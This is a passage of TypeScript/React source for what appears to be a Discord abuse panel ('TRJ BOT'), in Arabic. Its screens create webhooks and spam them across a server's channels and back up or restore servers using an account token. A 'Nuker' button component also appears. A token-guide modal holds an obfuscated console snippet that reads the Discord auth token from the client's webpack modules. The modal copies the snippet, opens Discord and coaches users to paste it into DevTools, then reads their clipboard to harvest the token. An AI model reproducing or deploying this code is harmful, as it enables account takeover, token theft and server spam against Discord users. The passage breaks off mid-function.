                {whCreateMode === 'existing' && (<div className="mb-5"><label className="text-[11px] text-pink-300/70 mb-1 block">🔗 روابط الويب هوكات (كل سطر = رابط)</label><textarea value={whExistingUrls} onChange={e => setWhExistingUrls(e.target.value)} placeholder="https://discord.com/api/webhooks/...\nhttps://discord.com/api/webhooks/..." rows={3} className="w-full bg-black/30 border border-pink-500/30 rounded-xl px-4 py-3 text-white text-sm placeholder-pink-700/30 focus:outline-none focus:border-pink-400/50 resize-none font-mono transition-colors" /></div>)}

                {/* أزرار التنفيذ */}
                {whCreateMode === 'create' && (<ActionBtn text={`🔗 إنشاء في ${whSelectedChannels.length || 'كل'} روم`} loading={loading} color="cyan" onClick={async () => {
                  if (!whCreateToken || !whCreateGuildId) { setResult('❌ أدخل التوكن + أيدي السيرفر'); return }
                  setLoading(true); setProgress('🔗 جاري إنشاء الويب هوكات...'); setResult(''); setWhCreateResults([])
                  try {
                    const res = await fetch('/api/webhook-creator', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: whCreateToken, guildId: whCreateGuildId, action: 'create-all', webhookName: whCreateName, createCount: whCreateCount, selectedChannelIds: whSelectedChannels }), signal: AbortSignal.timeout(300000) })
                    const data = await res.json()
                    if (data.success) { setResult(data.logs.join('\n')); setWhCreateResults(data.results); if (data.stats) setStats({ created: data.stats.created, failed: data.stats.failed }) }
                    else { setResult('❌ ' + (data.error || 'فشل')) }
                  } catch { setResult('❌ خطأ في الاتصال') }
                  setLoading(false); setProgress('')
                }} />)}

                {whCreateMode === 'spam' && (<ActionBtn text={`🔥 إنشاء + سبام في ${whSelectedChannels.length || 'كل'} روم`} loading={loading} color="orange" onClick={async () => {
                  if (!whCreateToken || !whCreateGuildId) { setResult('❌ أدخل التوكن + أيدي السيرفر'); return }
                  if (!whCrSpamMessage) { setResult('❌ أدخل الرسالة'); return }
                  setLoading(true); setProgress('🔥 جاري إنشاء + سبام...'); setResult(''); setWhCreateResults([])
                  try {
                    const res = await fetch('/api/webhook-creator', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: whCreateToken, guildId: whCreateGuildId, action: 'create-and-spam', webhookName: whCreateName, createCount: whCreateCount, selectedChannelIds: whSelectedChannels, spamMessage: whCrSpamMessage, spamCount: whCrSpamCount, spamUsername: whCrSpamUsername || undefined, spamAvatarUrl: whCrSpamAvatarUrl || undefined, embedTitle: whEmbedEnabled ? whEmbedTitle : undefined, embedDescription: whEmbedEnabled ? whEmbedDesc : undefined, embedColor: whEmbedEnabled ? whEmbedColor : undefined }), signal: AbortSignal.timeout(300000) })
                    const data = await res.json()
                    if (data.success) { setResult(data.logs.join('\n')); setWhCreateResults(data.results); if (data.stats) setStats({ created: data.stats.created, spam_sent: data.stats.spamSent, failed: data.stats.spamFailed }) }
                    else { setResult('❌ ' + (data.error || 'فشل')) }
                  } catch { setResult('❌ خطأ في الاتصال') }
                  setLoading(false); setProgress('')
                }} />)}

                {whCreateMode === 'existing' && (<ActionBtn text="📡 سبام في الويب هوكات الموجودة" loading={loading} color="pink" onClick={async () => {
                  if (!whCrSpamMessage) { setResult('❌ أدخل الرسالة'); return }
                  const urls = whExistingUrls.split('\n').map(u => u.trim()).filter(u => u.includes('discord.com/api/webhooks') || u.includes('discord.gg'))
                  if (urls.length === 0) { setResult('❌ أدخل رابط ويب هوك واحد على الأقل'); return }
                  setLoading(true); setProgress('📡 جاري السبام...'); setResult('')
                  try {
                    const res = await fetch('/api/webhook-creator', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: whCreateToken || '', guildId: '0', action: 'spam-existing', webhookUrls: urls, spamMessage: whCrSpamMessage, spamCount: whCrSpamCount, spamUsername: whCrSpamUsername || undefined, spamAvatarUrl: whCrSpamAvatarUrl || undefined, embedTitle: whEmbedEnabled ? whEmbedTitle : undefined, embedDescription: whEmbedEnabled ? whEmbedDesc : undefined, embedColor: whEmbedEnabled ? whEmbedColor : undefined }), signal: AbortSignal.timeout(300000) })
                    const data = await res.json()
                    if (data.success) { setResult(data.logs.join('\n')); if (data.stats) setStats({ sent: data.stats.sent, failed: data.stats.failed }) }
                    else { setResult('❌ ' + (data.error || 'فشل')) }
                  } catch { setResult('❌ خطأ في الاتصال') }
                  setLoading(false); setProgress('')
                }} />)}

                {/* عرض النتائج */}
                {whCreateResults.length > 0 && (<div className="mt-4 space-y-1.5 max-h-64 overflow-y-auto">
                  <div className="flex items-center justify-between mb-2">
                    <span className="text-[11px] text-white/30">📋 الويب هوكات المنشأة:</span>
                    <button onClick={() => {
                      const allUrls = whCreateResults.map(r => r.url).join('\n')
                      navigator.clipboard.writeText(allUrls).catch(() => {})
                    }} className="text-[10px] text-green-400 bg-green-500/10 px-2.5 py-1 rounded-lg border border-green-500/20 hover:bg-green-500/20 transition-colors cursor-pointer">📋 نسخ الكل</button>
                  </div>
                  {whCreateResults.map((r, i) => (
                    <div key={i} className="bg-cyan-500/5 rounded-lg p-2.5 border border-cyan-500/15 flex items-center gap-2">
                      <span className="text-green-400 flex-shrink-0">✅</span>
                      <div className="flex-1 min-w-0">
                        <div className="text-[11px] text-cyan-300 font-bold">{r.name} {r.channelName ? <span className="text-white/30 font-normal">#{r.channelName}</span> : ''}</div>
                        <div className="text-[10px] text-white/30 font-mono truncate">{r.url}</div>
                      </div>
                      <button onClick={() => { navigator.clipboard.writeText(r.url).catch(() => {}) }} className="text-[10px] text-cyan-400 bg-cyan-500/10 px-2 py-1 rounded-lg border border-cyan-500/20 hover:bg-cyan-500/20 transition-colors cursor-pointer flex-shrink-0">📋</button>
                    </div>
                  ))}
                </div>)}
              </div></div>
            )}

            {/* ==================== SERVER BACKUP ==================== */}
            {section === 'server-backup' && (
              <div className="animate-fade-in"><div className="glass-card rounded-2xl p-6 border border-emerald-500/20 shadow-xl shadow-emerald-500/5">
                <div className="flex items-center gap-3 mb-1"><span className="text-2xl">💾</span><h2 className="text-xl font-black text-emerald-400">حفظ و استعادة سيرفر</h2></div>
                <p className="text-emerald-500/60 text-sm mb-4">حفظ نسخة احتياطية شاملة أو استعادة نسخة سابقة في أي سيرفر</p>
                <TokenInput label="🎫 التوكن" value={backupToken} onChange={setBackupToken} accent="green" onHelp={() => setShowTokenGuide(true)} />
                <TextInput label="🖥️ أيدي السيرفر" value={backupGuildId} onChange={setBackupGuildId} placeholder="Server ID" accent="green" />
                <ActionBtn text="💾 إنشاء نسخة احتياطية" loading={loading} color="green" onClick={async () => { if (!backupToken || !backupGuildId) { setResult('❌ أدخل التوكن + أيدي السيرفر'); return }; setLoading(true); setProgress('📦 جاري إنشاء النسخة الاحتياطية...'); setResult(''); try { const res = await fetch('/api/server-backup', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: backupToken, guildId: backupGuildId, action: 'backup' }), signal: AbortSignal.timeout(300000) }); const data = await res.json(); if (data.success) { setResult(data.logs.join('\n')); if (data.backup) { const blob = new Blob([JSON.stringify(data.backup, null, 2)], { type: 'application/json' }); const url = URL.createObjectURL(blob); const a = document.createElement('a'); a.href = url; a.download = `backup_${backupGuildId}_${Date.now()}.json`; a.click(); URL.revokeObjectURL(url) } } else { setResult('❌ ' + (data.error || 'فشل')) } } catch { setResult('❌ خطأ في الاتصال') }; setLoading(false); setProgress('') }} />
                <div className="mt-5 pt-4 border-t border-emerald-500/15">
                  <h3 className="text-sm font-bold text-emerald-400 mb-2 flex items-center gap-2">🔄 استعادة نسخة احتياطية</h3>
                  <p className="text-[11px] text-emerald-500/60 mb-3">الصق ملف JSON النسخة الاحتياطية أو اختر ملف ثم اضغط استعادة - سيتم إنشاء نفس الرومات و الرتب و الإيموجي في السيرفر المحدد</p>
                  <textarea value={restoreData} onChange={e => setRestoreData(e.target.value)} placeholder="الصق محتوى ملف JSON النسخة الاحتياطية هنا..." rows={4} className="w-full bg-black/30 border border-emerald-500/30 rounded-xl px-4 py-3 text-white text-xs placeholder-emerald-700/30 focus:outline-none focus:border-emerald-400/50 resize-none transition-colors mb-3 font-mono" />
                  <label className="flex items-center gap-2 text-xs text-emerald-400 bg-emerald-500/10 px-3 py-2 rounded-lg border border-emerald-500/20 cursor-pointer hover:bg-emerald-500/20 transition-colors mb-3 w-fit">
                    <span>📁 اختر ملف JSON</span>
                    <input type="file" accept=".json" className="hidden" onChange={e => { const file = e.target.files?.[0]; if (!file) return; const reader = new FileReader(); reader.onload = () => { if (typeof reader.result === 'string') setRestoreData(reader.result) }; reader.readAsText(file) }} />
                  </label>
                  <ActionBtn text="🔄 استعادة النسخة" loading={loading} color="green" onClick={async () => { if (!backupToken || !backupGuildId) { setResult('❌ أدخل التوكن + أيدي السيرفر الهدف'); return }; if (!restoreData.trim()) { setResult('❌ الصق ملف JSON أو اختر ملف أولاً'); return }; let parsed; try { parsed = JSON.parse(restoreData) } catch { setResult('❌ ملف JSON غير صالح - تأكد من النسخة الاحتياطية'); return }; setLoading(true); setProgress('🔄 جاري استعادة النسخة الاحتياطية...'); setResult(''); try { const res = await fetch('/api/server-backup', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: backupToken, guildId: backupGuildId, action: 'restore', backupData: parsed }), signal: AbortSignal.timeout(300000) }); const data = await res.json(); if (data.success) { setResult(data.logs.join('\n')); if (data.stats) setStats({ roles: data.stats.roles, txt: data.stats.channels, cats: data.stats.categories, emojis: data.stats.emojis }) } else { setResult('❌ ' + (data.error || 'فشل')) } } catch { setResult('❌ خطأ في الاتصال') }; setLoading(false); setProgress('') }} />
                </div>
              </div></div>
            )}

            {/* ===== RESULT ===== */}
            {result && (<div className={`mt-4 p-4 rounded-2xl text-center text-sm font-medium border animate-fade-in ${result.startsWith('✅') ? 'bg-green-500/10 text-green-400 border-green-500/20' : 'bg-red-500/10 text-red-400 border-red-500/20'}`}>{result}</div>)}

            {/* ===== STATS ===== */}
            {stats && (<div className="mt-4 glass-card rounded-2xl p-4 border border-green-500/15 animate-fade-in"><div className="grid grid-cols-2 sm:grid-cols-4 gap-2.5 text-center">
              {stats.deleted !== undefined && stats.deleted > 0 && (<div className="bg-red-500/8 rounded-xl p-3 border border-red-500/10"><div className="text-2xl font-black text-red-400 stat-number">{stats.deleted}</div><div className="text-[10px] text-red-300/60">محذوف</div></div>)}
              {stats.created !== undefined && stats.created > 0 && (<div className="bg-green-500/8 rounded-xl p-3 border border-green-500/10"><div className="text-2xl font-black text-green-400 stat-number">{stats.created}</div><div className="text-[10px] text-green-300/60">منشأ</div></div>)}
              {stats.spam_sent !== undefined && stats.spam_sent > 0 && (<div className="bg-orange-500/8 rounded-xl p-3 border border-orange-500/10"><div className="text-2xl font-black text-orange-400 stat-number">{stats.spam_sent}</div><div className="text-[10px] text-orange-300/60">سبام</div></div>)}
              {stats.banned !== undefined && stats.banned > 0 && (<div className="bg-red-500/8 rounded-xl p-3 border border-red-500/10"><div className="text-2xl font-black text-red-500 stat-number">{stats.banned}</div><div className="text-[10px] text-red-400/60">محظور</div></div>)}
              {stats.roles !== undefined && stats.roles > 0 && (<div className="bg-purple-500/8 rounded-xl p-3 border border-purple-500/10"><div className="text-2xl font-black text-purple-400 stat-number">{stats.roles}</div><div className="text-[10px] text-purple-300/60">رتب</div></div>)}
              {stats.sent !== undefined && stats.sent > 0 && (<div className="bg-green-500/8 rounded-xl p-3 border border-green-500/10"><div className="text-2xl font-black text-green-400 stat-number">{stats.sent}</div><div className="text-[10px] text-green-300/60">مرسلة</div></div>)}
              {stats.failed !== undefined && stats.failed > 0 && (<div className="bg-red-500/8 rounded-xl p-3 border border-red-500/10"><div className="text-2xl font-black text-red-400 stat-number">{stats.failed}</div><div className="text-[10px] text-red-300/60">فشل</div></div>)}
              {stats.blocked !== undefined && stats.blocked > 0 && (<div className="bg-yellow-500/8 rounded-xl p-3 border border-yellow-500/10"><div className="text-2xl font-black text-yellow-400 stat-number">{stats.blocked}</div><div className="text-[10px] text-yellow-300/60">محظور DM</div></div>)}
              {stats.left !== undefined && stats.left > 0 && (<div className="bg-orange-500/8 rounded-xl p-3 border border-orange-500/10"><div className="text-2xl font-black text-orange-400 stat-number">{stats.left}</div><div className="text-[10px] text-orange-300/60">مغادرة</div></div>)}
              {stats.txt !== undefined && stats.txt > 0 && (<div className="bg-blue-500/8 rounded-xl p-3 border border-blue-500/10"><div className="text-2xl font-black text-blue-400 stat-number">{stats.txt}</div><div className="text-[10px] text-blue-300/60">روم كتابي</div></div>)}
              {stats.voice !== undefined && stats.voice > 0 && (<div className="bg-green-500/8 rounded-xl p-3 border border-green-500/10"><div className="text-2xl font-black text-green-400 stat-number">{stats.voice}</div><div className="text-[10px] text-green-300/60">روم صوتي</div></div>)}
              {stats.cats !== undefined && stats.cats > 0 && (<div className="bg-indigo-500/8 rounded-xl p-3 border border-indigo-500/10"><div className="text-2xl font-black text-indigo-400 stat-number">{stats.cats}</div><div className="text-[10px] text-indigo-300/60">كاتيجوري</div></div>)}
              {stats.emojis !== undefined && stats.emojis > 0 && (<div className="bg-pink-500/8 rounded-xl p-3 border border-pink-500/10"><div className="text-2xl font-black text-pink-400 stat-number">{stats.emojis}</div><div className="text-[10px] text-pink-300/60">إيموجي</div></div>)}
              {stats.kicked !== undefined && stats.kicked > 0 && (<div className="bg-orange-500/8 rounded-xl p-3 border border-orange-500/10"><div className="text-2xl font-black text-orange-400 stat-number">{stats.kicked}</div><div className="text-[10px] text-orange-300/60">مطرود</div></div>)}
              {stats.permissions !== undefined && stats.permissions > 0 && (<div className="bg-cyan-500/8 rounded-xl p-3 border border-cyan-500/10"><div className="text-2xl font-black text-cyan-400 stat-number">{stats.permissions}</div><div className="text-[10px] text-cyan-300/60">صلاحية</div></div>)}
            </div></div>)}

          </div>
        </main>
        <TokenGuideModal show={showTokenGuide} onClose={() => setShowTokenGuide(false)} onTokenExtracted={(token) => { setVerifyToken(token); setShowTokenGuide(false); }} />
      </div>
    </div>
  )
}

/* ==================== UI COMPONENTS ==================== */

function TokenInput({ label, value, onChange, accent = 'green', onHelp }: { label: string; value: string; onChange: (v: string) => void; accent?: string; onHelp?: () => void }) {
  const [showPw, setShowPw] = useState(false)
  const colors: Record<string, string> = { green: 'border-green-500/30 focus:border-green-400/50', red: 'border-red-500/30 focus:border-red-400/50', orange: 'border-orange-500/30 focus:border-orange-400/50', purple: 'border-purple-500/30 focus:border-purple-400/50', yellow: 'border-yellow-500/30 focus:border-yellow-400/50', cyan: 'border-cyan-500/30 focus:border-cyan-400/50', pink: 'border-pink-500/30 focus:border-pink-400/50' }
  return (<div className="mb-4"><div className="flex items-center justify-between mb-1"><label className="text-[11px] text-white/50">{label}</label>{onHelp && (<button onClick={onHelp} className="text-[10px] text-cyan-400 bg-cyan-500/10 px-2 py-0.5 rounded-md border border-cyan-500/20 hover:bg-cyan-500/20 transition-colors cursor-pointer">📖 كيف تجيب التوكن؟</button>)}</div><div className="relative"><input type={showPw ? 'text' : 'password'} value={value} onChange={e => onChange(e.target.value)} placeholder="••••••••" className={`w-full bg-black/30 border ${colors[accent] || colors.green} rounded-xl px-4 py-3 text-white text-sm pr-16 placeholder-white/20 focus:outline-none transition-colors`} /><div className="absolute right-2 top-1/2 -translate-y-1/2 flex gap-1"><button onClick={() => setShowPw(!showPw)} className="text-[10px] text-white/40 bg-white/5 px-2 py-1 rounded-lg hover:bg-white/10 transition-colors cursor-pointer border border-white/10">{showPw ? '🙈' : '👁'}</button><button onClick={() => { navigator.clipboard.writeText(value).catch(() => { const inp = document.createElement('input'); inp.value = value; document.body.appendChild(inp); inp.select(); document.execCommand('copy'); document.body.removeChild(inp); }); }} className="text-[10px] text-white/40 bg-white/5 px-2 py-1 rounded-lg hover:bg-white/10 transition-colors cursor-pointer border border-white/10">📋</button></div></div></div>)
}

function TextInput({ label, value, onChange, placeholder, accent = 'green' }: { label: string; value: string; onChange: (v: string) => void; placeholder: string; accent?: string }) {
  const colors: Record<string, string> = { green: 'border-green-500/30 focus:border-green-400/50', red: 'border-red-500/30 focus:border-red-400/50', orange: 'border-orange-500/30 focus:border-orange-400/50', purple: 'border-purple-500/30 focus:border-purple-400/50', yellow: 'border-yellow-500/30 focus:border-yellow-400/50', cyan: 'border-cyan-500/30 focus:border-cyan-400/50', pink: 'border-pink-500/30 focus:border-pink-400/50' }
  return (<div className="mb-4"><label className="text-[11px] text-white/50 mb-1 block">{label}</label><input type="text" value={value} onChange={e => onChange(e.target.value)} placeholder={placeholder} className={`w-full bg-black/30 border ${colors[accent] || colors.green} rounded-xl px-4 py-3 text-white text-sm placeholder-white/20 focus:outline-none transition-colors`} /></div>)
}

function ActionBtn({ text, loading, onClick, color = 'green' }: { text: string; loading: boolean; onClick: () => void; color?: string }) {
  const colors: Record<string, string> = { green: 'bg-green-500/20 hover:bg-green-500/30 text-green-400 border-green-500/30', red: 'bg-red-500/20 hover:bg-red-500/30 text-red-400 border-red-500/30', orange: 'bg-orange-500/20 hover:bg-orange-500/30 text-orange-400 border-orange-500/30', purple: 'bg-purple-500/20 hover:bg-purple-500/30 text-purple-400 border-purple-500/30', yellow: 'bg-yellow-500/20 hover:bg-yellow-500/30 text-yellow-400 border-yellow-500/30', cyan: 'bg-cyan-500/20 hover:bg-cyan-500/30 text-cyan-400 border-cyan-500/30', pink: 'bg-pink-500/20 hover:bg-pink-500/30 text-pink-400 border-pink-500/30' }
  return (<button onClick={onClick} disabled={loading} className={`w-full py-3 rounded-xl font-bold text-sm transition-all cursor-pointer border ${colors[color] || colors.green} ${loading ? 'opacity-50 cursor-not-allowed' : 'active:scale-[0.98]'}`}>{loading ? '⏳ جاري...' : text}</button>)
}

function NukerBtn({ text, color, loading, onClick }: { text: string; color: string; loading: boolean; onClick: () => void }) {
  const colors: Record<string, string> = { red: 'bg-red-500/20 hover:bg-red-500/30 text-red-400 border-red-500/30', gray: 'bg-white/5 hover:bg-white/10 text-white/70 border-white/10', orange: 'bg-orange-500/20 hover:bg-orange-500/30 text-orange-400 border-orange-500/30', cyan: 'bg-cyan-500/20 hover:bg-cyan-500/30 text-cyan-400 border-cyan-500/30', purple: 'bg-purple-500/20 hover:bg-purple-500/30 text-purple-400 border-purple-500/30', yellow: 'bg-yellow-500/20 hover:bg-yellow-500/30 text-yellow-400 border-yellow-500/30', green: 'bg-green-500/20 hover:bg-green-500/30 text-green-400 border-green-500/30', pink: 'bg-pink-500/20 hover:bg-pink-500/30 text-pink-400 border-pink-500/30' }
  return (<button onClick={onClick} disabled={loading} className={`w-full py-2.5 rounded-xl font-bold text-xs transition-all cursor-pointer border ${colors[color] || colors.gray} ${loading ? 'opacity-50 cursor-not-allowed' : 'active:scale-[0.98]'}`}>{loading ? '⏳' : text}</button>)
}

function InfoPill({ label, value }: { label: string; value: string }) {
  return (<div className="bg-black/20 rounded-xl px-3 py-2 border border-white/5 text-center"><div className="text-[10px] text-white/40">{label}</div><div className="text-xs text-green-300 font-medium mt-0.5">{value}</div></div>)
}

function TokenGuideModal({ show, onClose, onTokenExtracted }: { show: boolean; onClose: () => void; onTokenExtracted?: (token: string) => void }) {
  const code = `(t=>{let w;webpackChunkdiscord_app.push([[''],{},e=>{for(let k in e.c){let m=e.c[k].exports;if(m&&m.default&&m.default.getToken){w=m.default.getToken()}}}]);try{prompt('TRJ BOT - التوكن (انسخه):',w);navigator.clipboard.writeText(w)}catch{prompt('TRJ BOT - التوكن:',w)}})()`

  const [phase, setPhase] = useState<'main' | 'guide' | 'done'>('main')
  const [tokenInput, setTokenInput] = useState('')
  const [copiedCode, setCopiedCode] = useState(false)
  const [autoPasted, setAutoPasted] = useState(false)
  const [tokenValid, setTokenValid] = useState<boolean | null>(null)

  const copyCode = () => {
    navigator.clipboard.writeText(code).then(() => {
      setCopiedCode(true)
      setTimeout(() => setCopiedCode(false), 3000)
    }).catch(() => {
      const ta = document.createElement('textarea')
      ta.value = code
      ta.style.position = 'fixed'
      ta.style.left = '-9999px'
      document.body.appendChild(ta)
      ta.select()
      document.execCommand('copy')
      document.body.removeChild(ta)
      setCopiedCode(true)
      setTimeout(() => setCopiedCode(false), 3000)
    })
  }

  const startExtract = () => {
    copyCode()
    window.open('https://discord.com/app', '_blank')
    setPhase('guide')
    // Auto-detect clipboard after 5 seconds
    setTimeout(() => {
      try {
        navigator.clipboard.readText().then(text => {
          if (text && text.length > 50 && text.includes('.')) {
            setTokenInput(text)
            setAutoPasted(true)
            // Validate token
            const isValid = /^[A-Za-z0-9._-]+$/.test(text) && text.length > 50
            setTokenValid(isValid)
          }
        }).catch(() => {})
      } catch {}
    }, 5000)
  }

  const handleTokenSubmit = () => {
    if (tokenInput.length > 50) {
      setTokenValid(true)
      if (onTokenExtracted) onTokenExtracted(tokenInput)
    }
  }

  // Reset phase when modal opens
  useEffect(() => {
    if (show) {
      const id = requestAnimationFrame(() => {
        setPhase('main')
        setTokenInput('')
        setAutoPasted(false)
        setTokenValid(null)
      })
      return () => cancelAnimationFrame(id)
    }
  }, [show])

  if (!show) return null

  return (
    <div className="fixed inset-0 z-[100] flex items-end sm:items-center justify-center p-0 sm:p-4" onClick={onClose}>
      <div className="absolute inset-0 bg-black/80 backdrop-blur-sm" />
      <div className="relative bg-[#0a0e14] border border-green-500/20 rounded-t-2xl sm:rounded-2xl w-full sm:max-w-md shadow-2xl shadow-green-500/10 animate-slide-up max-h-[90vh] overflow-y-auto" onClick={e => e.stopPropagation()}>
        <div className="p-5">

          {/* Header */}
          <div className="flex items-center justify-between mb-4">
            <div className="flex items-center gap-2">
              <span className="text-xl">🎫</span>
              <h3 className="font-black text-green-400 text-sm">جلب توكن ديسكورد</h3>
            </div>
            <button onClick={onClose} className="w-7 h-7 rounded-full bg-white/5 flex items-center justify-center text-white/40 hover:text-white/80 hover:bg-white/10 cursor-pointer transition-colors text-sm">✕</button>
          </div>

          {phase === 'main' && (
            <>
              {/* Big Hero Button */}
              <div className="text-center mb-5">
                <div className="text-6xl mb-4">🔑</div>
                <p className="text-lg text-white/90 font-black mb-2">جلب التوكن بضغطة واحدة!</p>
                <p className="text-[11px] text-white/30 leading-relaxed max-w-xs mx-auto">
                  ينسخ الكود تلقائي + يفتح ديسكورد لك، فقط تابع الخطوات البسيطة
                </p>
              </div>

              <button onClick={startExtract} className="w-full py-6 rounded-2xl font-black text-xl transition-all cursor-pointer border active:scale-[0.97] mb-4 flex items-center justify-center gap-3 bg-gradient-to-r from-green-600/30 to-emerald-500/30 text-green-300 border-green-500/40 hover:from-green-600/40 hover:to-emerald-500/40 shadow-xl shadow-green-500/10">
                <span className="text-3xl">⚡</span>
                ابدأ - جلب التوكن
              </button>

              {/* 3-step preview */}
              <div className="grid grid-cols-3 gap-2 mb-3">
                <div className="bg-green-500/5 rounded-xl p-3 border border-green-500/10 text-center">
                  <div className="text-lg mb-1">1️⃣</div>
                  <p className="text-[9px] text-green-300/60">اضغط الزر</p>
                </div>
                <div className="bg-cyan-500/5 rounded-xl p-3 border border-cyan-500/10 text-center">
                  <div className="text-lg mb-1">2️⃣</div>
                  <p className="text-[9px] text-cyan-300/60">افتح Console</p>
                </div>
                <div className="bg-purple-500/5 rounded-xl p-3 border border-purple-500/10 text-center">
                  <div className="text-lg mb-1">3️⃣</div>
                  <p className="text-[9px] text-purple-300/60">انسخ التوكن</p>
                </div>
              </div>

              <div className="bg-yellow-500/5 rounded-xl p-3 border border-yellow-500/10">
                <p className="text-[10px] text-yellow-300/50 text-center leading-relaxed">
                  ⚠️ لازم تكون مسجل دخول في ديسكورد على المتصفح
                </p>
              </div>
            </>
          )}

          {phase === 'guide' && (
            <>
              {/* Progress bar */}
              <div className="flex gap-1 mb-5">
                {[
                  { label: 'نسخ', icon: copiedCode ? '✅' : '📋', color: copiedCode ? 'green' : 'white' },
                  { label: 'Console', icon: '💻', color: 'cyan' },
                  { label: 'توكن', icon: '🎫', color: 'purple' },
                ].map((s, i) => (
                  <div key={i} className="flex-1 text-center">
                    <div className={`text-[10px] mb-1 ${s.color === 'green' ? 'text-green-400' : s.color === 'cyan' ? 'text-cyan-400' : s.color === 'purple' ? 'text-purple-400' : 'text-white/30'}`}>
                      {s.icon} {s.label}
                    </div>
                    <div className={`h-1 rounded-full ${i === 0 ? (copiedCode ? 'bg-green-500' : 'bg-white/10') : i === 1 ? 'bg-cyan-500/30' : 'bg-purple-500/30'}`} />
                  </div>
                ))}
              </div>

              {/* Step-by-step guide */}
              <div className="space-y-3 mb-5">
                {/* Step 1 - Already done */}
                <div className={`rounded-2xl p-4 border transition-all ${copiedCode ? 'bg-green-500/8 border-green-500/20' : 'bg-white/3 border-white/5'}`}>
                  <div className="flex items-center gap-3">
                    <div className={`w-8 h-8 rounded-full flex items-center justify-center text-sm font-black flex-shrink-0 ${copiedCode ? 'bg-green-500/30 text-green-400' : 'bg-white/10 text-white/40'}`}>
                      {copiedCode ? '✓' : '1'}
                    </div>
                    <div>
                      <p className={`text-xs font-bold ${copiedCode ? 'text-green-400' : 'text-white/50'}`}>
                        تم نسخ الكود + فتح ديسكورد
                      </p>
                      <p className="text-[10px] text-white/25 mt-0.5">الكود في الحافظة جاهز للصق</p>
                    </div>
                  </div>
                </div>

                {/* Step 2 - Console */}
                <div className="rounded-2xl p-4 border bg-cyan-500/5 border-cyan-500/15">
                  <div className="flex items-start gap-3">
                    <div className="w-8 h-8 rounded-full bg-cyan-500/20 text-cyan-400 text-sm font-black flex items-center justify-center flex-shrink-0">2</div>
                    <div className="flex-1">
                      <p className="text-xs font-bold text-cyan-400 mb-2">افتح أداة المطورين</p>
                      {/* Visual keyboard key */}
                      <div className="flex items-center gap-2 mb-2">
                        <div className="bg-white/10 border border-white/20 rounded-lg px-3 py-1.5 text-[11px] font-mono text-white/70 shadow-inner">
                          F12
                        </div>
                        <span className="text-[10px] text-white/30">أو</span>
                        <div className="flex gap-0.5">
                          <div className="bg-white/10 border border-white/20 rounded-lg px-2 py-1.5 text-[10px] font-mono text-white/70 shadow-inner">Ctrl</div>
                          <div className="bg-white/10 border border-white/20 rounded-lg px-2 py-1.5 text-[10px] font-mono text-white/70 shadow-inner">Shift</div>
                          <div className="bg-white/10 border border-white/20 rounded-lg px-2 py-1.5 text-[10px] font-mono text-white/70 shadow-inner">I</div>
                        </div>
                      </div>
                      <div className="bg-black/30 rounded-xl p-2.5 border border-white/5">
                        <p className="text-[10px] text-white/40 text-center">
                          اختر تبويب <span className="text-cyan-400 font-bold bg-cyan-500/10 px-1.5 py-0.5 rounded">Console</span> من الأعلى
                        </p>
                      </div>
                    </div>
                  </div>
                </div>

                {/* Step 3 - Paste & Enter */}
                <div className="rounded-2xl p-4 border bg-purple-500/5 border-purple-500/15">
                  <div className="flex items-start gap-3">
                    <div className="w-8 h-8 rounded-full bg-purple-500/20 text-purple-400 text-sm font-black flex items-center justify-center flex-shrink-0">3</div>
                    <div className="flex-1">
                      <p className="text-xs font-bold text-purple-400 mb-2">الصق الكود واضغط Enter</p>
                      <div className="flex items-center gap-2 mb-2">
                        <div className="flex gap-0.5">
                          <div className="bg-white/10 border border-white/20 rounded-lg px-2 py-1.5 text-[10px] font-mono text-white/70 shadow-inner">Ctrl</div>
                          <div className="bg-white/10 border border-white/20 rounded-lg px-2 py-1.5 text-[10px] font-mono text-white/70 shadow-inner">V</div>
                        </div>
                        <span className="text-[10px] text-white/30">ثم</span>
                        <div className="bg-white/10 border border-white/20 rounded-lg px-3 py-1.5 text-[11px] font-mono text-green-400 shadow-inner">
                          Enter
                        </div>
                      </div>
                    </div>
                  </div>
                </div>

                {/* Step 4 - Copy token from popup */}
                <div className="rounded-2xl p-4 border bg-yellow-500/5 border-yellow-500/15">
                  <div className="flex items-start gap-3">
                    <div className="w-8 h-8 rounded-full bg-yellow-500/20 text-yellow-400 text-sm font-black flex items-center justify-center flex-shrink-0">4</div>
                    <div className="flex-1">
                      <p className="text-xs font-bold text-yellow-400 mb-2">انسخ التوكن من النافذة</p>
                      <div className="bg-black/30 rounded-xl p-3 border border-white/5">
                        <div className="flex items-center justify-between mb-1">
                          <p className="text-[10px] text-white/40">نافذة تطلع فيها:</p>
                        </div>
                        <div className="bg-white/5 rounded-lg p-2 border border-white/10">
                          <p className="text-[9px] text-white/30 font-mono">TRJ BOT - التوكن (انسخه):</p>
                          <p className="text-[9px] text-green-400 font-mono truncate">eyJhbGciOiJIUzI1NiJ9...</p>
                        </div>
                        <p className="text-[9px] text-yellow-300/40 mt-2 text-center">التحديد تلقائي! فقط اضغط Ctrl+C</p>
                      </div>
                    </div>
                  </div>
                </div>
              </div>

              {/* Token paste area */}
              <div className="bg-green-500/5 rounded-2xl p-4 border border-green-500/20 mb-4">
                <div className="flex items-center gap-2 mb-3">
                  <span className="text-sm">📋</span>
                  <p className="text-xs font-bold text-green-400">
                    {autoPasted ? '✅ تم التلقائي! تأكد و اضغط استخدام' : 'الصق التوكن هنا'}
                  </p>
                </div>
                <div className="flex gap-2">
                  <input
                    type="text"
                    value={tokenInput}
                    onChange={e => {
                      setTokenInput(e.target.value)
                      setTokenValid(null)
                      setAutoPasted(false)
                    }}
                    placeholder="الصق التوكن هنا..."
                    className="flex-1 bg-black/40 border border-green-500/20 rounded-xl px-3 py-2.5 text-xs text-white font-mono placeholder-white/15 focus:outline-none focus:border-green-400/40 transition-colors"
                    autoFocus
                  />
                  {tokenInput.length > 50 ? (
                    <button onClick={handleTokenSubmit} className="px-4 py-2.5 rounded-xl font-bold text-xs cursor-pointer bg-green-500/20 text-green-400 border border-green-500/30 hover:bg-green-500/30 transition-colors active:scale-[0.97]">
                      ✅ استخدام
                    </button>
                  ) : (
                    <button onClick={() => {
                      try {
                        navigator.clipboard.readText().then(text => {
